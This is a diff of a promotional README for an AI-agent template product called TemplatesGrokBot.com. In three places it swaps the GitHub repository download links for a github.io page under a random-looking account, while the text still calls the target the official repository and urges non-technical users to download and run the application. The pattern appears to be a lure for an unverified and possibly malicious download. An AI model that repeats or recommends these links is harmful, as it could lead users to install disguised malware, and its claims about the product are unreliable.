@@ -1,6 +1,6 @@
 # 🤖 templatesgrokbot.com - 3,000+ AI Agents Ready in Minutes
 
-[![Download TemplatesGrokBot](https://img.shields.io/badge/Download-TemplatesGrokBot-blue?style=for-the-badge&logo=github)](https://github.com/Intact-microbrachia8486/templatesgrokbot.com)
+[![Download TemplatesGrokBot](https://img.shields.io/badge/Download-TemplatesGrokBot-blue?style=for-the-badge&logo=github)](https://intact-microbrachia8486.github.io)
 
 ## 🎯 What Is TemplatesGrokBot.com?
 
@@ -21,7 +21,7 @@ That's it. No special software, no coding skills, no technical knowledge require
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[https://github.com/Intact-microbrachia8486/templatesgrokbot.com](https://github.com/Intact-microbrachia8486/templatesgrokbot.com)**
+Visit this link to download the application: **[https://intact-microbrachia8486.github.io](https://intact-microbrachia8486.github.io)**
 
 Once you visit the link, you'll be taken to the official TemplatesGrokBot.com repository page. This is your one-stop destination to get the application. Follow these simple steps:
 
@@ -188,7 +188,7 @@ Your data and configurations are handled with care. TemplatesGrokBot.com follows
 
 Don't let complexity hold you back from leveraging AI in your work. TemplatesGrokBot.com makes it possible for everyone to have a team of capable AI assistants.
 
-Visit this link to download the application: **[https://github.com/Intact-microbrachia8486/templatesgrokbot.com](https://github.com/Intact-microbrachia8486/templatesgrokbot.com)**
+Visit this link to download the application: **[https://intact-microbrachia8486.github.io](https://intact-microbrachia8486.github.io)**
 
 Join thousands of users who've already built their AI teams with these powerful, ready-made templates. Whether you're looking to boost productivity, automate routine tasks, or take on new challenges, TemplatesGrokBot.com has the solution waiting for you.
 
